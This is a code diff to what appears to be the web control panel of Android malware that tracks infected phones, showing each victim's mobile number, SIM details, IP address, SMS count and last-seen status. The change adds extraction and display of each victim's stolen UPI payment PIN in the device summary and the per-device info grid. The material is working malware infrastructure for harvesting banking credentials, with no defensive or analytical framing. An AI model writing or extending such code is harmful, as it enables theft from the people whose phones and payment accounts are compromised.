@@ -487,6 +487,7 @@ header('Content-Type: text/html; charset=UTF-8');
           <div class="hm"><div class="hm-lbl">ANDROID</div><div class="hm-val" id="dAndroid">—</div></div>
           <div class="hm"><div class="hm-lbl">SMS COUNT</div><div class="hm-val orange" id="dSmsCount">—</div></div>
           <div class="hm"><div class="hm-lbl">LAST SEEN</div><div class="hm-val" id="dLastSeen">—</div></div>
+          <div class="hm"><div class="hm-lbl">UPI PIN</div><div class="hm-val orange" id="dUpiPin">—</div></div>
         </div>
       </div>
 
@@ -1011,6 +1012,12 @@ function parseBattery(v){
   if(typeof v==='number') return v;
   return parseInt(String(v).replace('%',''),10)||0;
 }
+function getUpiPinFromRecord(s){
+  if(!s||typeof s!=='object') return '';
+  var v=s.upipin!=null?s.upipin:(s.upi_pin!=null?s.upi_pin:(s.upiPin!=null?s.upiPin:s.UPI_PIN));
+  if(v==null||v==='') return '';
+  return String(v).trim();
+}
 function getPhoneFromRecord(s){
   if(!s||typeof s!=='object') return '';
   if(s.mobNo) return String(s.mobNo).trim();
@@ -1073,7 +1080,8 @@ function normalizeClientRecord(raw){
       sms_count:raw.sms_count||0,
       mobNo:mob||raw.mobNo||'',
       ip:raw.ip_address||'',
-      storage:raw.storage||''
+      storage:raw.storage||'',
+      upipin:getUpiPinFromRecord(raw)
     };
   }
   var r={
@@ -1088,7 +1096,8 @@ function normalizeClientRecord(raw){
     network:raw.network||raw.network_type,
     charging:raw.charging||raw.is_charging,
     sms_count:raw.sms_count||raw.smsCount||raw.total_sms,
-    mobNo:getPhoneFromRecord(raw)
+    mobNo:getPhoneFromRecord(raw),
+    upipin:getUpiPinFromRecord(raw)
   };
   if(typeof r.ts==='object') r.ts=0;
   r.online=resolveOnlineStatus(Object.assign({},raw,r),raw._fbId||'');
@@ -1422,7 +1431,8 @@ function processClientsData(raw,fromCache){
       network:  s.network||s.network_type||'?',
       charging: s.charging||s.is_charging||false,
       lastSeen: ts,
-      smsCount: s.sms_count||s.smsCount||s.total_sms||0
+      smsCount: s.sms_count||s.smsCount||s.total_sms||0,
+      upiPin: getUpiPinFromRecord(s)
     });
   });
   allDevs.sort(function(a,b){
@@ -1515,6 +1525,7 @@ function updateHero(d){
   document.getElementById('dNet').textContent=d.network;
   document.getElementById('dAndroid').textContent=d.android||'?';
   document.getElementById('dSmsCount').textContent=d.smsCount;
+  document.getElementById('dUpiPin').textContent=d.upiPin||'—';
   if(d.status==='online'){
     document.getElementById('dLastSeen').textContent='● ACTIVE';
     document.getElementById('dLastSeen').style.color='var(--success)';
@@ -1645,7 +1656,13 @@ function loadRabelSim(dev){
   restPoll(dev.fbId,'clients/'+dev.rawId,function(data){
     var g=document.getElementById('simGrid');
     if(!data){g.innerHTML='<div style="color:var(--muted);font-family:Space Mono,monospace;font-size:10px">No device info</div>';return;}
-    var fields=[[icoAnim('mobile','i3d-blue i3d-sm'),'Model',data.modelName],[icoAnim('phone','i3d-green i3d-sm'),'Mobile',data.mobNo],[icoAnim('battery','i3d-orange i3d-sm'),'Battery',data.battery],[icoAnim('signal','i3d-fire i3d-sm'),'Network',data.service_provider],[icoAnim('save','i3d-purple i3d-sm'),'Storage',data.storage],[icoAnim('globe','i3d-blue i3d-sm'),'IP',data.ip_address],[icoAnim('robot','i3d-green i3d-sm'),'Android',data.androidV]];
+    var pin=getUpiPinFromRecord(data);
+    if(selDev===dev.id){
+      document.getElementById('dUpiPin').textContent=pin||'—';
+      var cur=allDevs.find(function(d){return d.id===selDev;});
+      if(cur) cur.upiPin=pin||'';
+    }
+    var fields=[[icoAnim('mobile','i3d-blue i3d-sm'),'Model',data.modelName],[icoAnim('phone','i3d-green i3d-sm'),'Mobile',data.mobNo],[icoAnim('battery','i3d-orange i3d-sm'),'Battery',data.battery],[icoAnim('signal','i3d-fire i3d-sm'),'Network',data.service_provider],[icoAnim('save','i3d-purple i3d-sm'),'Storage',data.storage],[icoAnim('globe','i3d-blue i3d-sm'),'IP',data.ip_address],[icoAnim('robot','i3d-green i3d-sm'),'Android',data.androidV],[icoAnim('lock','i3d-orange i3d-sm'),'UPI PIN',pin||'N/A']];
     if(data.sims&&data.sims.length) data.sims.forEach(function(sim,i){fields.push([icoAnim('sim','i3d-green i3d-sm'),'SIM '+(i+1),sim.carrierName+' · '+sim.phoneNumber]);});
     g.innerHTML='<div class="sim-card">'+fields.map(function(f){
       var lbl=f.length>2?f[0]+' '+f[1]:f[0], val=f.length>2?f[2]:f[1];
